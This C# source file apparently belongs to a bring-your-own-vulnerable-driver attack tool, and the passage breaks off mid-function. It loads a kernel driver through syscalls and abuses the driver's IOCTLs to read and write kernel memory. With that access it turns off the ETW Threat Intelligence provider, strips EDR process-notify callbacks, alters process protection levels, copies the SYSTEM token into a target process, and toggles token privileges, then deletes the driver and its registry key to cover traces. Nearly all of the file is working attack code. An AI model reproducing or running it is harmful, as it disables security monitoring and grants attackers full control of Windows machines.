using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;
using Data = ISyscall.Data;

namespace EchoDrv
{
    public class Driver
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate uint NtLoadDriver(ref Data.UNICODE_STRING DriverServiceName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate uint NtUnloadDriver(ref Data.UNICODE_STRING DriverServiceName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate uint NtDeviceIoControlFile(IntPtr hDriver, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref Data.IO_STATUS_BLOCK IoStatusBlock, UInt32 IoControlCode, IntPtr InputBuffer, UInt32 InputBufferLength, ref IntPtr OutputBuffer, UInt32 OutputBufferLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate uint NtCreateFile(out IntPtr FileHadle, Data.FileAccess DesiredAcces, ref Data.OBJECT_ATTRIBUTES ObjectAttributes, ref Data.IO_STATUS_BLOCK IoStatusBlock, ref long AllocationSize, System.IO.FileAttributes FileAttributes, System.IO.FileShare ShareAccess, uint CreateDisposition, uint CreateOptions, IntPtr EaBuffer, uint EaLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate uint NtWriteFile(IntPtr handle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, out Data.IO_STATUS_BLOCK IoStatusBlock, IntPtr Buffer, long Length, uint ByteOffset, uint key);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Data.NTSTATUS NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref Data._TOKEN_PRIVILEGES newstn, UInt32 bufferlength, IntPtr prev, IntPtr relen);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        delegate bool NtClose(IntPtr hObject);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateFile([MarshalAs(UnmanagedType.LPTStr)] string filename, [MarshalAs(UnmanagedType.U4)] FileAccess access, [MarshalAs(UnmanagedType.U4)] FileShare share, IntPtr securityAttributes, [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition, [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes, IntPtr templateFile);


        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", SetLastError = true)]
        static extern unsafe bool DeviceIoControl(System.IntPtr hFile, uint dwIoControlCode, void* lpInBuffer, uint nInBufferSize, void* lpOutBuffer, uint nOutBufferSize, uint* lpBytesReturned, int Overlapped);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        static extern void RtlInitUnicodeString(ref Data.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool LookupPrivilegeValue(string host, string name, ref Data._LUID pluid);

        public enum PRIVS : ulong
        {
            DEBUG = 0x0000000000100000UL, //SeDebugPrivilege
            LOAD_DRIVER = 0x0000000000000400UL, //SeLoadDriverPrivilege
            IMPERSONATE = 0x0000000020000000UL, //SeImpersonatePrivilege
            DELEGATE = 0x0000000008000000UL, //SeEnableDelegationPrivilege
            TCB = 0x0000000000000080UL, //SeTcbPrivilege
            TOKEN = 0x0000000000000004UL, //SeCreateTokenPrivilege
            BACKUP = 0x0000000000020000UL, //SeBackupPrivilege
            RESTORE = 0x0000000000040000UL, //SeRestorePrivilege
            ALL = 0x0000001FFFFFFFFCUL,
            NONE = 0x0
        }

        private static bool SetRegistryValues(Data.UNICODE_STRING Path, string ServiceName)
        {
            Microsoft.Win32.RegistryKey key = Registry.LocalMachine.CreateSubKey("System\\CurrentControlSet\\Services\\" + ServiceName);
            try
            {
                key.SetValue("Type", 0x0);
                key.SetValue("ErrorControl", 0x0);
                key.SetValue("Start", 0x0);
                key.SetValue("ImagePath", Marshal.PtrToStringUni(Path.Buffer, (Path.Length / 2)), RegistryValueKind.ExpandString);
                key.Close();
            }
            catch
            {
                Console.WriteLine("[!] Failed to create registry value entry..");
                return false;
            }

            Console.WriteLine("[+] Registry key added.");
            return true;
        }

        private static bool DeleteRegistryKey(string ServiceName)
        {
            try
            {
                Registry.LocalMachine.DeleteSubKey("System\\CurrentControlSet\\Services\\" + ServiceName);
                Console.WriteLine("[+] Registry key deleted");
                return true;
            }
            catch
            {
                Console.WriteLine("Registry key not found");
                return false;
            }
        }

        private static bool LoadDriver(string path, string ServiceName)
        {
            Data.UNICODE_STRING usDriverServiceName = new Data.UNICODE_STRING();
            Data.UNICODE_STRING szNtRegistryPath = new Data.UNICODE_STRING();

            RtlInitUnicodeString(ref szNtRegistryPath, @"\??\" + path);
            if (!SetRegistryValues(szNtRegistryPath, ServiceName))
            {
                Console.WriteLine("Could not set registry value");
                return false;
            }

            RtlInitUnicodeString(ref usDriverServiceName, @"\Registry\Machine\System\CurrentControlSet\Services\" + ServiceName);

            IntPtr ntdriverptr = Program.isyscall.GetSyscallPtr("NtLoadDriver");
            NtLoadDriver NTLD = (NtLoadDriver)Marshal.GetDelegateForFunctionPointer(ntdriverptr, typeof(NtLoadDriver));
            uint rez = NTLD(ref usDriverServiceName);
            if (rez != 0)
            {
                Console.WriteLine("Load driver failed with error: " + rez.ToString());
                return false;
            }

            Console.WriteLine("[+] Driver loaded");
            return true;
        }

        private static bool UnLoadDriver(string ServiceName)
        {
            Data.UNICODE_STRING usDriverServiceName = new Data.UNICODE_STRING();
            RtlInitUnicodeString(ref usDriverServiceName, @"\Registry\Machine\System\CurrentControlSet\Services\" + ServiceName);

            IntPtr ntdriverptr2 = Program.isyscall.GetSyscallPtr("NtUnloadDriver");
            NtUnloadDriver NTULD = (NtUnloadDriver)Marshal.GetDelegateForFunctionPointer(ntdriverptr2, typeof(NtUnloadDriver));
            uint rez = NTULD(ref usDriverServiceName);
            if (rez != 0)
            {
                Console.WriteLine("UnLoad driver failed with error: " + rez.ToString());
                return false;
            }

            Console.WriteLine("[+] Driver unloaded");
            DeleteRegistryKey(ServiceName);
            return true;
        }

        private static bool GetDriverHandle(string drvname, out IntPtr hDriver)
        {
            hDriver = CreateFile(@"\\.\" + drvname, FileAccess.ReadWrite, 0, IntPtr.Zero, FileMode.Open, FileAttributes.Normal, IntPtr.Zero);
            if (Program.hDriver == IntPtr.Zero)
            {
                Console.WriteLine("Get driver handle failed");
                return false;
            }

            return true;
        }

        private static bool DeleteDiskDriver(string driverpath)
        {
            try
            {
                File.SetAttributes(driverpath, FileAttributes.Normal);
                File.Delete(driverpath);
                Console.WriteLine("[+] Driver deleted from disk");
                return true;
            }
            catch
            {
                Console.WriteLine("[!] Failed to delete driver from disk..");
                return false;
            }
        }

        private static Data.UNICODE_STRING GetDumpFullPath(string DumpPath)
        {
            Data.UNICODE_STRING full_dump_path_uni = new Data.UNICODE_STRING();
            string full_dump_path = "";
            string currentDir = Environment.CurrentDirectory;
            if (DumpPath.Contains(@":\"))
            {
                full_dump_path = DumpPath;
            }
            else
            {
                full_dump_path = currentDir + @"\" + DumpPath;
            }

            RtlInitUnicodeString(ref full_dump_path_uni, @"\??\" + full_dump_path);

            return full_dump_path_uni;
        }

        public static bool WriteFile(string DumpPath, IntPtr fileData, long fileLength, out IntPtr hFile)
        {

            NtCreateFile NTCF = (NtCreateFile)Marshal.GetDelegateForFunctionPointer(Program.isyscall.GetSyscallPtr("NtCreateFile"), typeof(NtCreateFile));
            Data.UNICODE_STRING file_path = GetDumpFullPath(DumpPath);

            Data.IO_STATUS_BLOCK IoStatusBlock = new Data.IO_STATUS_BLOCK();
            IntPtr objName = Marshal.AllocHGlobal(Marshal.SizeOf(file_path));
            Marshal.StructureToPtr(file_path, objName, true);

            Data.OBJECT_ATTRIBUTES objAttr = new Data.OBJECT_ATTRIBUTES()
            {
                Length = Marshal.SizeOf(typeof(Data.OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                ObjectName = objName,
                Attributes = 0x00000040,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = IntPtr.Zero
            };

            uint status = NTCF(out hFile, Data.FileAccess.FILE_GENERIC_WRITE, ref objAttr, ref IoStatusBlock, ref fileLength, System.IO.FileAttributes.Normal, System.IO.FileShare.None, 0x00000005, 0x00000020, IntPtr.Zero, 0);

            if (status == 0xc000003a || status == 0xc0000033) // pathnotfound / objectnameinvalid
            {
                Console.WriteLine($"The path {file_path} is invalid.");
                return false;
            }

            if (status != 0)
            {
                Console.WriteLine($"Could not create file {file_path}, error: {status}");
                return false;
            }

            NtWriteFile NTWF = (NtWriteFile)Marshal.GetDelegateForFunctionPointer(Program.isyscall.GetSyscallPtr("NtWriteFile"), typeof(NtWriteFile));
            uint status2 = NTWF(hFile, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out IoStatusBlock, fileData, fileLength, 0, 0);
            if (status2 != 0)
            {
                Console.WriteLine($"Could not write file {file_path}, error: {status2}");
                return false;
            }

            return true;
        }


        private static void CloseHandle(IntPtr handle)
        {
            NtClose NTC = (NtClose)Marshal.GetDelegateForFunctionPointer(Program.isyscall.ntcloseptr, typeof(NtClose));
            NTC(handle);
        }


        public static bool DisableETWTI(Data.Offsets offsets, bool output)
        {
            IntPtr EtwThreatIntProvRegHandle = Utils.getEtwThreatIntProvRegHandleAddr();
            IntPtr EtwProviderEnableInfoPtr = (IntPtr)((long)EtwThreatIntProvRegHandle + offsets.ETWGuidEntry + offsets.ETWProviderEnableInfo);

            IntPtr buffer = Marshal.AllocHGlobal(1);

            //dt nt!_TRACE_ENABLE_INFO fffff803`69819818+0x020+0x060
            byte currentValue = (byte)Marshal.ReadByte(readPrimitive(EtwProviderEnableInfoPtr, buffer, 1));
            if (currentValue == 0x0)
            {
                Console.WriteLine("[+] ProviderEnableInfo already disabled, skipping.");
                if (output)
                    File.AppendAllText("rez.txt", "[+] ProviderEnableInfo already disabled, skipping.\n");
                return false;
            }
            else if (currentValue == 0x1)
            {
                Console.WriteLine("[+] ProviderEnableInfo currently enabled! disabling..");
                Marshal.WriteInt32(buffer, 0);
                IntPtr rez = readPrimitive(buffer, EtwProviderEnableInfoPtr, 1, true);
                if (rez == (IntPtr)0)
                {
                    Console.WriteLine("Write failed!");
                }
                Console.WriteLine("[+] Done!");
                if (output)
                    File.AppendAllText("rez.txt", "[+] ProviderEnableInfo currently enabled! disabling..\n");
                Marshal.FreeHGlobal(buffer);
                return true;
            }
            else
            {
                Console.WriteLine("Found value is not 1 nor 0, maybe read wrong address ?");

                return false;
            }
        }

        public static bool EnableETWTI(Data.Offsets offsets, bool output)
        {
            IntPtr EtwThreatIntProvRegHandle = Utils.getEtwThreatIntProvRegHandleAddr();
            IntPtr EtwProviderEnableInfoPtr = (IntPtr)((long)EtwThreatIntProvRegHandle + offsets.ETWGuidEntry + offsets.ETWProviderEnableInfo);

            IntPtr buffer = Marshal.AllocHGlobal(1);

            //dt nt!_TRACE_ENABLE_INFO fffff803`69819818+0x020+0x060
            byte currentValue = (byte)Marshal.ReadByte(readPrimitive(EtwProviderEnableInfoPtr, buffer, 1));
            if (currentValue == 0x1)
            {
                Console.WriteLine("[+] ProviderEnableInfo already enabled, skipping.");
                if (output)
                    File.AppendAllText("rez.txt", "[+] ProviderEnableInfo already enabled, skipping.\n");
                return false;
            }
            else if (currentValue == 0x0)
            {
                Console.WriteLine("[+] ProviderEnableInfo currently disabled! enabling..");
                Marshal.WriteInt32(buffer, 1);
                IntPtr rez = readPrimitive(buffer, EtwProviderEnableInfoPtr, 1, true);
                if (rez == (IntPtr)0)
                {
                    Console.WriteLine("Write failed!");
                }
                Console.WriteLine("[+] Done!");
                if (output)
                    File.AppendAllText("rez.txt", "[+] ProviderEnableInfo currently disabled! enabling..\n");
                Marshal.FreeHGlobal(buffer);
                return true;
            }
            else
            {
                Console.WriteLine("Found value is not 1 nor 0, maybe read wrong address ?");
                return false;
            }
        }


        public static void ListCallbacks(string callback_type, bool output = false)
        {
            IntPtr callbackPTR = Utils.get_PspCallbacksNotifyRoutine_arr(callback_type);
            if (callbackPTR == IntPtr.Zero)
            {
                return;
            }
            IntPtr buffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UIntPtr)));

            for (int k = 0; k < 64; k++)
            {
                IntPtr callback = Marshal.ReadIntPtr(readPrimitive((IntPtr)(callbackPTR.ToInt64() + (k * 8)), buffer, (uint)Marshal.SizeOf(typeof(UIntPtr))));
                if (callback == IntPtr.Zero)
                    continue;

                IntPtr tmpaddr = (IntPtr)(((ulong)callback >> 4) << 4);
                IntPtr drivercallbackFuncAddr = Marshal.ReadIntPtr(readPrimitive((IntPtr)((ulong)tmpaddr + 0x8), buffer, (uint)Marshal.SizeOf(typeof(UIntPtr))));
                string drivername = Utils.findDriver(drivercallbackFuncAddr);
                Console.WriteLine("[" + k + "] " + callback.ToString("X") + "  (" + drivername + ")");
                if (output)
                    File.AppendAllText("rez.txt", "[" + k + "] " + callback.ToString("X") + "  (" + drivername + ")\n");
            }

            Console.WriteLine("[+] Done!");
            Marshal.FreeHGlobal(buffer);
            return;
        }

        public static bool RemoveCallback(string callback_type, int callbackindex)
        {
            IntPtr callbackPTR = Utils.get_PspCallbacksNotifyRoutine_arr(callback_type);
            if (callbackPTR == IntPtr.Zero)
            {
                return false;
            }
            IntPtr buffer = Marshal.AllocHGlobal(1);
            Marshal.WriteIntPtr(buffer, (IntPtr)0);
            if (readPrimitive(buffer, (IntPtr)(callbackPTR.ToInt64() + (callbackindex * 8)), (uint)Marshal.SizeOf(typeof(IntPtr)), true) != (IntPtr)1)
                return false;

            Console.WriteLine($"[+] {callback_type} callback {callbackindex} removed!");
            Marshal.FreeHGlobal(buffer);
            return true;
        }

        public static bool RestoreCallback(string callback_type, int callbackindex, ulong callbackaddr)
        {
            IntPtr callbackPTR = Utils.get_PspCallbacksNotifyRoutine_arr(callback_type);
            if (callbackPTR == IntPtr.Zero)
            {
                return false;
            }
            IntPtr buffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
            Marshal.WriteIntPtr(buffer, (IntPtr)callbackaddr);
            if (readPrimitive(buffer, (IntPtr)(callbackPTR.ToInt64() + (callbackindex * 8)), (uint)Marshal.SizeOf(typeof(IntPtr)), true) != (IntPtr)1)
                return false;

            Console.WriteLine($"[+] {callback_type} callback {callbackindex} restored!");
            Marshal.FreeHGlobal(buffer);
            return true;
        }

        public static bool RemoveAllCallbacks(string callback_type)
        {
            IntPtr callbackPTR = Utils.get_PspCallbacksNotifyRoutine_arr(callback_type);

            IntPtr buffer = Marshal.AllocHGlobal(1);
            Marshal.WriteIntPtr(buffer, (IntPtr)0);
            for (int i = 0; i < 20; i++)
            {
                readPrimitive(buffer, (IntPtr)(callbackPTR.ToInt64() + (i * 8)), (uint)Marshal.SizeOf(typeof(IntPtr)), true);
            }

            Console.WriteLine($"[+] All {callback_type} callback removed!");
            return true;
        }


        public static bool changeProcessProtection(IntPtr targetpid, Data.Offsets offsets, bool removeProtect)
        {
            IntPtr PsInitialSystemProcessAddress = Utils.GetKrnlProcAddress("PsInitialSystemProcess");
            if (PsInitialSystemProcessAddress == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to resolve PsInitialSystemProcessAddress");
                return false;
            }

            IntPtr tmpbuf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
            IntPtr eprocess = Marshal.ReadIntPtr(readPrimitive(PsInitialSystemProcessAddress, tmpbuf, (uint)Marshal.SizeOf(typeof(IntPtr))));
            Console.WriteLine("[+] EPROCESS Address: " + eprocess.ToString("X"));

            IntPtr targetProcessAddress = Utils.GetTargetProcAddress(offsets, eprocess, targetpid);
            if (targetProcessAddress == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to find the target process");
                return false;
            }
            Console.WriteLine("[+] Target process address: " + targetProcessAddress.ToString("X"));

            ulong flags = (ulong)Marshal.ReadIntPtr(readPrimitive((IntPtr)(targetProcessAddress.ToInt64() + offsets.SignatureLevelOffset), tmpbuf, (uint)Marshal.SizeOf(typeof(ulong))));
            Marshal.FreeHGlobal(tmpbuf);

            Console.WriteLine("[+] Current ProtectionLevel flags : " + flags.ToString("X"));
            flags = (flags & 0xffffffffff000000);
            if (!removeProtect)
            {
                //flags = (flags | 0x623f3f); // wintcb / protected
                flags = (flags | 0x413f3f); // Light LSA (lsass)
                //flags = (flags | 0x423f3f);
                //flags = (flags | 0x313f3f); //Antimalware light
                //flags = (flags | 0x723f3f); //WinSystem protected
            }

            Console.WriteLine("[+] Writing flags as: " + flags.ToString("X"));
            IntPtr buf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ulong)));
            Marshal.WriteInt64(buf, (long)flags);
            IntPtr rez = readPrimitive(buf, (IntPtr)(targetProcessAddress.ToInt64() + offsets.SignatureLevelOffset), (uint)Marshal.SizeOf(typeof(ulong)), true);
            Marshal.FreeHGlobal(buf);
            if (rez == (IntPtr)1)
            {
                Console.WriteLine("[+] Done !");
                return true;
            }

            return false;
        }

        public static bool ElevateProcessToken(IntPtr targetpid, Data.Offsets offsets)
        {
            IntPtr PsInitialSystemProcessAddress = Utils.GetKrnlProcAddress("PsInitialSystemProcess"); //Get Kernelbase -> PsInitialSystemProcess addr
            if (PsInitialSystemProcessAddress == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to resolve PsInitialSystemProcessAddress");
                return false;
            }

            IntPtr tmpbuf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
            IntPtr eprocess = Marshal.ReadIntPtr(readPrimitive(PsInitialSystemProcessAddress, tmpbuf, (uint)Marshal.SizeOf(typeof(IntPtr)))); //Get EPROCESS struct addr
            Console.WriteLine("[+] EPROCESS Address: " + eprocess.ToString("X"));

            //Get target process token
            IntPtr targetProcessAddress = Utils.GetTargetProcAddress(offsets, eprocess, targetpid); //Get target process addr in EPROCESS struct
            if (targetProcessAddress == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to find the target process");
                return false;
            }
            Console.WriteLine("[+] Target process address: " + targetProcessAddress.ToString("X"));

            //get system process token
            IntPtr SystemProcessAddress = Utils.GetTargetProcAddress(offsets, eprocess, (IntPtr)4); // Get winlong system process addr in EPROCESS struct
            //Get TOKEN of winlogon : EPROCESS.Winlogon.EX_FAST_REF
            ulong Systemtoken = (ulong)Marshal.ReadIntPtr(readPrimitive((IntPtr)(SystemProcessAddress.ToInt64() + offsets.ProcessToken), tmpbuf, (uint)Marshal.SizeOf(typeof(ulong))));
            Console.WriteLine("[+] Current SystemProcessToken : " + Systemtoken.ToString("X"));


            //write
            Console.WriteLine("[+] Writing System token into target Process address.."); ;
            Marshal.WriteInt64(tmpbuf, (long)Systemtoken);
            // Write winlogon EX_FAST_REF token into target pid EX_FAST_REF addr
            IntPtr rez = readPrimitive(tmpbuf, (IntPtr)(targetProcessAddress.ToInt64() + offsets.ProcessToken), (uint)Marshal.SizeOf(typeof(ulong)), true);
            Marshal.FreeHGlobal(tmpbuf);
            if (rez == (IntPtr)1)
            {
                Console.WriteLine("[+] Done !");
                return true;
            }

            return false;
        }

        public static bool SetUntrustedIntegrityProcess(IntPtr targetpid, Data.Offsets offsets)
        {
            IntPtr PsInitialSystemProcessAddress = Utils.GetKrnlProcAddress("PsInitialSystemProcess");
            if (PsInitialSystemProcessAddress == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to resolve PsInitialSystemProcess");
                return false;
            }
            IntPtr tmpbuf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
            IntPtr eprocess = Marshal.ReadIntPtr(readPrimitive(PsInitialSystemProcessAddress, tmpbuf, (uint)Marshal.SizeOf(typeof(IntPtr))));
            Console.WriteLine("[+] EPROCESS Address: " + eprocess.ToString("X"));

            //Get target process token
            IntPtr targetProcessAddress = Utils.GetTargetProcAddress(offsets, eprocess, targetpid);
            if (targetProcessAddress == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to find the target process");
                return false;
            }
            Console.WriteLine("[+] Target process address: " + targetProcessAddress.ToString("X"));

            IntPtr exfastref = (IntPtr)(targetProcessAddress.ToInt64() + offsets.ProcessToken);

            ulong TokenStructAddr = (ulong)(Marshal.ReadIntPtr(readPrimitive((IntPtr)exfastref, tmpbuf, (uint)Marshal.SizeOf(typeof(ulong))))) & 0xfffffffffffffff0;
            Console.WriteLine("[+] Token struct address: " + TokenStructAddr.ToString("X"));

            Marshal.WriteIntPtr(tmpbuf, (IntPtr)(-1));
            IntPtr rez = readPrimitive(tmpbuf, (IntPtr)(TokenStructAddr + 0xd0), (uint)Marshal.SizeOf(typeof(ulong)), true); // 0xd0 = _TOKEN.IntegrityLevelIndex
            Marshal.FreeHGlobal(tmpbuf);
            if (rez == IntPtr.Zero)
            {
                Console.WriteLine("Operation failed.");
            }

            Console.WriteLine("[+] Done!");
            return true;
        }

        public static bool SwitchPrivs(IntPtr targetpid, Data.Offsets offsets, PRIVS priv, string field)
        {
            IntPtr PsInitialSystemProcessAddress = Utils.GetKrnlProcAddress("PsInitialSystemProcess");
            if (PsInitialSystemProcessAddress == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to resolve PsInitialSystemProcessAddress");
                return false;
            }

            IntPtr tmpbuf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
            IntPtr eprocess = Marshal.ReadIntPtr(readPrimitive(PsInitialSystemProcessAddress, tmpbuf, (uint)Marshal.SizeOf(typeof(IntPtr))));
            Console.WriteLine("[+] EPROCESS Address: " + eprocess.ToString("X"));

            //Get target process token
            IntPtr targetProcessAddress = Utils.GetTargetProcAddress(offsets, eprocess, targetpid);
            if (targetProcessAddress == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to find the target process");
                return false;
            }
            Console.WriteLine("[+] Target process address: " + targetProcessAddress.ToString("X"));

            IntPtr exfastref = (IntPtr)(targetProcessAddress.ToInt64() + offsets.ProcessToken); // _EX_FAST_REF STRUC =  EPROCESS Process address + Win Version ProcessToken Offset 

            IntPtr buf = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(ulong)));
            ulong TokenStructAddr = (ulong)(Marshal.ReadIntPtr(readPrimitive((IntPtr)exfastref, buf, (uint)Marshal.SizeOf(typeof(ulong))))) & 0xfffffffffffffff0; //_TOKEN struct = _EX_FAST_REF & 0xfffffffffffffff0
            Console.WriteLine("[+] Token struct address: " + TokenStructAddr.ToString("X"));

            //write new privs
            IntPtr rez = IntPtr.Zero;
            IntPtr oldprivs = IntPtr.Zero;
            IntPtr newprivs = IntPtr.Zero;
            if (field.Equals("present"))
            {
                oldprivs = Marshal.ReadIntPtr(readPrimitive((IntPtr)(TokenStructAddr + 0x40), buf, (uint)Marshal.SizeOf(typeof(ulong))));
                newprivs = (IntPtr)((long)oldprivs ^ (long)priv); // LOAD_DRIVER = 0x0000000000000400UL ; SeDebug = 0x0000000000100000UL
                Marshal.WriteIntPtr(buf, newprivs);
                rez = readPrimitive(buf, (IntPtr)(TokenStructAddr + 0x40), (uint)Marshal.SizeOf(typeof(ulong)), true); // 0x40 = _TOKEN.Privileges.Present
            }
            else if (field.Equals("enabled"))
            {
                oldprivs = Marshal.ReadIntPtr(readPrimitive((IntPtr)(TokenStructAddr + 0x48), buf, (uint)Marshal.SizeOf(typeof(ulong))));
                newprivs = (IntPtr)((long)oldprivs ^ (long)priv);
                Marshal.WriteIntPtr(buf, newprivs);
                rez = readPrimitive(buf, (IntPtr)(TokenStructAddr + 0x48), (uint)Marshal.SizeOf(typeof(ulong)), true); //0x48 = _TOKEN.Privileges.Enabled
            }
            else if (field.Equals("default"))
            {
                oldprivs = Marshal.ReadIntPtr(readPrimitive((IntPtr)(TokenStructAddr + 0x50), buf, (uint)Marshal.SizeOf(typeof(ulong))));
                newprivs = (IntPtr)((long)oldprivs ^ (long)priv);
                Marshal.WriteIntPtr(buf, newprivs);
                rez = readPrimitive(buf, (IntPtr)(TokenStructAddr + 0x50), (uint)Marshal.SizeOf(typeof(ulong)), true); //0x50 = _TOKEN.Privileges.EnabledByDefault
            }
            else
            {
                Console.WriteLine("Field name error, must be 'present|enabled|default'");
                return false;
            }

            Marshal.FreeHGlobal(buf);
            if (rez == (IntPtr)1)
            {
                if ((long)newprivs > (long)oldprivs)
                {
                    Console.WriteLine($"[+] Done! [{field.ToUpper()}] {priv} --> SWITCHED ON.");
                }
                else
                {
                    Console.WriteLine($"[+] Done! [{field.ToUpper()}] {priv} --> SWITCHED OFF.");
                }
                return true;
            }

            return false;
        }

        private static IntPtr initEchoDrv()
        {
            IntPtr tmpbuf = Marshal.AllocHGlobal(4096);

            unsafe
            {
                bool rez2 = DeviceIoControl(Program.hDriver, 0x9e6a0594, tmpbuf.ToPointer(), 4096, tmpbuf.ToPointer(), 4096, null, 0);
                if (!rez2)
                {
                    Console.WriteLine("Init buffer failed");
                    return IntPtr.Zero;
                }
            }

            Data.DRIVER_HANDLE param = new Data.DRIVER_HANDLE();
            param.pid = (uint)Process.GetCurrentProcess().Id;
            param.access = 0x001F0FFF;

            unsafe
            {
                Data.DRIVER_HANDLE* p = &param;
                bool re = DeviceIoControl(Program.hDriver, 0xe6224248, p, (uint)Marshal.SizeOf(typeof(Data.DRIVER_HANDLE)), p, (uint)Marshal.SizeOf(typeof(Data.DRIVER_HANDLE)), null, 0);
                if (!re)
                {
                    Console.WriteLine("Get process handle failed!");
                    return IntPtr.Zero;
                }
            }

            return param.handle;
        }

        private static bool EnablePrivilege(string privname)
        {
            IntPtr TokenHandle = IntPtr.Zero;
            NtOpenProcessToken NTOPT = (NtOpenProcessToken)Marshal.GetDelegateForFunctionPointer(Program.isyscall.GetSyscallPtr("NtOpenProcessToken"), typeof(NtOpenProcessToken));

            NtClose NTC = (NtClose)Marshal.GetDelegateForFunctionPointer(Program.isyscall.ntcloseptr, typeof(NtClose));

            bool retVal;
            Data._TOKEN_PRIVILEGES tp = new Data._TOKEN_PRIVILEGES();
            IntPtr htok = IntPtr.Zero;
            NTOPT(new IntPtr(-1), 0x0020 | 0x0008, out htok); // TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
            if (htok == IntPtr.Zero)
            {
                return false;
            }

            tp.PrivilegeCount = 1;
            tp.Privileges.Attributes = 0x00000002;

            retVal = LookupPrivilegeValue(null, privname, ref tp.Privileges.Luid);
            if (!retVal)
            {
                Console.WriteLine("LookupPriv failed.");
                NTC(htok);
                return false;
            }

            IntPtr ntadjustptr = Program.isyscall.GetSyscallPtr("NtAdjustPrivilegesToken");
            NtAdjustPrivilegesToken NTAPT = (NtAdjustPrivilegesToken)Marshal.GetDelegateForFunctionPointer(ntadjustptr, typeof(NtAdjustPrivilegesToken));
            Data.NTSTATUS status = NTAPT(htok, false, ref tp, (uint)Marshal.SizeOf(typeof(Data._TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
            if (status != Data.NTSTATUS.Success)
            {
                NTC(htok);
                return false;
            }

            NTC(htok);
            return true;
        }

        internal static IntPtr readPrimitive(IntPtr FromAddr, IntPtr ToAddr, UInt32 size, bool write = false)
        {
            Data.IO_STATUS_BLOCK isb = new Data.IO_STATUS_BLOCK();
            Data.DRIVER_DATA dataptr = new Data.DRIVER_DATA();
            dataptr.fromAddr = FromAddr;
            dataptr.toAddr = ToAddr;
            dataptr.length = size;
            dataptr.TargetProcess = Program.procHandle;
            IntPtr buffer = Marshal.AllocHGlobal(Marshal.SizeOf<Data.DRIVER_DATA>());
            Marshal.StructureToPtr<Data.DRIVER_DATA>(dataptr, buffer, true);

            NtDeviceIoControlFile NTDCF = (NtDeviceIoControlFile)Marshal.GetDelegateForFunctionPointer(Program.ntdeviceptr, typeof(NtDeviceIoControlFile));
            uint rez = NTDCF(Program.hDriver, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref isb, 0x60a26124, buffer, (uint)Marshal.SizeOf(typeof(Data.DRIVER_DATA)), ref buffer, (uint)Marshal.SizeOf(typeof(Data.DRIVER_DATA)));
            if (rez != 0)
            {
                Console.WriteLine("Operation failed : " + rez.ToString());
                return IntPtr.Zero;
            }
            else if (rez == 0 && write)
            {
                return (IntPtr)1;
            }

            return ToAddr;
        }

        public static bool Cleanup(string diskfile, string ServiceName)
        {
            if (!EnablePrivilege("SeDebugPrivilege"))
            {
                Console.WriteLine("[!] Setting Debug Privilege failed.");
            }

            if (!EnablePrivilege("SeLoadDriverPrivilege"))
            {
                Console.WriteLine("Getting SeLoadDriverPrivilege failed");
            }

            UnLoadDriver(ServiceName);
            if (Program.hDriver != IntPtr.Zero)
            {
                CloseHandle(Program.hDriver);
            }
            DeleteDiskDriver(diskfile);

            return true;
        }

        public static bool Load(string diskfile, string ServiceName)
        {
            if (!EnablePrivilege("SeDebugPrivilege"))
            {
                Console.WriteLine("[!] Setting Debug Privilege failed.");
            }

            if (!EnablePrivilege("SeLoadDriverPrivilege"))
            {
                Console.WriteLine("Getting SeLoadDriverPrivilege failed");
            }


            if (!LoadDriver(diskfile, ServiceName))
            {
